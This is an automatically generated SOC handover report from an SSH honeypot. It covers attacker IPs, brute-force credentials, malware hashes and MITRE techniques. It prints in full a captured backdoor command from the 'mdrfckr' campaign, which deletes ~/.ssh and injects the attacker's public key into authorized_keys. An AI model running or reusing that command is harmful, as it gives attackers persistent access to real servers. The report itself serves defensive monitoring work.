# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-25 |
| **Generated At** | 2026-03-25T18:54:09Z |
| **Shift Time** | 18:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **68** |
| Confirmed Threats | **28** |
| False Positives Filtered | **40** (58.8%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **18** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **21** |
| Unique Credential Pairs | **21** |
| Unique Usernames | **16** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `Unknown` | 2 |
| `root` | 2 |
| `guest` | 2 |
| `centos` | 2 |
| `nobody` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123qwe` | 1 |
| `121212` | 1 |
| `test555` | 1 |
| `applmgr123` | 1 |
| `logon` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `Unknown` | `123qwe` | 1 |
| `User` | `121212` | 1 |
| `test` | `test555` | 1 |
| `applmgr` | `applmgr123` | 1 |
| `Support` | `logon` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `vps2026` | `31.193.137.190` | 2026-03-25T17:43:05 |
| `root` | `3245gs5662d34` | `31.193.137.190` | 2026-03-25T17:43:09 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `31.193.137.190`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **28** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS3462` | Data Communication Business Group | 3 | MEDIUM |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS46562` | Performive LLC | 2 | LOW |
| `AS4788` | TM TECHNOLOGY SERVICES SDN. BHD. | 1 | LOW |
| `AS14593` | Space Exploration Technologies Corporation | 1 | HIGH |
| `AS6805` | Telefonica Germany GmbH & Co.OHG | 1 | LOW |
| `AS199739` | Earthlink Telecommunications Equipment Trading & Services DMCC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-870b50cbc93c

| Field | Detail |
|---|---|
| **Source IP** | `31.193.137[.]190` |
| **First Seen** | 2026-03-25 17:43 |
| **Last Seen** | 2026-03-25 17:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 17:43:04` | `cowrie.session.connect` |
| `2026-03-25 17:43:04` | `cowrie.client.version` |
| `2026-03-25 17:43:04` | `cowrie.client.kex` |
| `2026-03-25 17:43:05` | `cowrie.login.success` |
| `2026-03-25 17:43:05` | `cowrie.session.params` |
| `2026-03-25 17:43:05` | `cowrie.command.input` |
| `2026-03-25 17:43:05` | `cowrie.command.failed` |
| `2026-03-25 17:43:05` | `cowrie.log.closed` |
| `2026-03-25 17:43:06` | `cowrie.session.params` |
| `2026-03-25 17:43:06` | `cowrie.command.input` |
| `2026-03-25 17:43:06` | `cowrie.session.file_download` |
| `2026-03-25 17:43:06` | `cowrie.log.closed` |
| `2026-03-25 17:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.193.137[.]190` to AbuseIPDB if not already reported
- [ ] Block `31.193.137[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bd740677c3d

| Field | Detail |
|---|---|
| **Source IP** | `31.193.137[.]190` |
| **First Seen** | 2026-03-25 17:43 |
| **Last Seen** | 2026-03-25 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 17:43:08` | `cowrie.session.connect` |
| `2026-03-25 17:43:08` | `cowrie.client.version` |
| `2026-03-25 17:43:09` | `cowrie.client.kex` |
| `2026-03-25 17:43:09` | `cowrie.login.success` |
| `2026-03-25 17:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.193.137[.]190` to AbuseIPDB if not already reported
- [ ] Block `31.193.137[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.112[.]243` | **7** | 2026-03-25 17:36 | 2026-03-25 17:50 | 10m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `31.193.137[.]190` | **3** | 2026-03-25 17:37 | 2026-03-25 17:43 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.15[.]178` | **2** | 2026-03-25 18:15 | 2026-03-25 18:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.21[.]178` | 1 | 2026-03-25 17:34 | 2026-03-25 17:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.35.213[.]149` | 1 | 2026-03-25 17:17 | 2026-03-25 17:18 | 30s | 0 | `T1592` | 🟢 LOW |
| `12.150.243[.]22` | 1 | 2026-03-25 17:45 | 2026-03-25 17:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-03-25 18:37 | 2026-03-25 18:37 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `148.227.83[.]0` | 1 | 2026-03-25 18:05 | 2026-03-25 18:07 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.81.33[.]183` | 1 | 2026-03-25 17:22 | 2026-03-25 17:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.82.97[.]80` | 1 | 2026-03-25 17:55 | 2026-03-25 17:55 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.99.89[.]74` | 1 | 2026-03-25 18:37 | 2026-03-25 18:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.189.126[.]185` | 1 | 2026-03-25 18:46 | 2026-03-25 18:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.69.42[.]204` | 1 | 2026-03-25 17:33 | 2026-03-25 17:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.12.164[.]176` | 1 | 2026-03-25 18:33 | 2026-03-25 18:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.179.8[.]171` | 1 | 2026-03-25 17:37 | 2026-03-25 17:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `71.12.241[.]225` | 1 | 2026-03-25 17:03 | 2026-03-25 17:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `84.240.224[.]102` | 1 | 2026-03-25 17:55 | 2026-03-25 17:55 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 9/100 | 🟢 LOW | **23/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `84.240.224[.]102` | KZ | MEGAPOLIS_KAZ | **100** ⚠️ | 40 |
| `183.81.33[.]183` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `12.150.243[.]22` | US | AT&T Enterprises, LLC | **100** ⚠️ | 9 |
| `121.202.146[.]144` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 48 |
| `31.193.137[.]190` | GB | Team Blue Carrier Limited | **100** ⚠️ | 0 |
| `45.12.164[.]176` | ES | TELEVALENTIN, S.L | **100** ⚠️ | 0 |
| `183.82.97[.]80` | IN | ACT HYD | **100** ⚠️ | 0 |
| `14.103.112[.]243` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |
| `183.99.89[.]74` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `20.163.15[.]178` | US | Microsoft Corporation | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 26 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 68 cases |
| Tool 34  | Credential Extractor        | ✅ 21 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (58.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 17 recon entry/entries in table (3 group(s) consolidating 12 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-25T18:54:09Z_
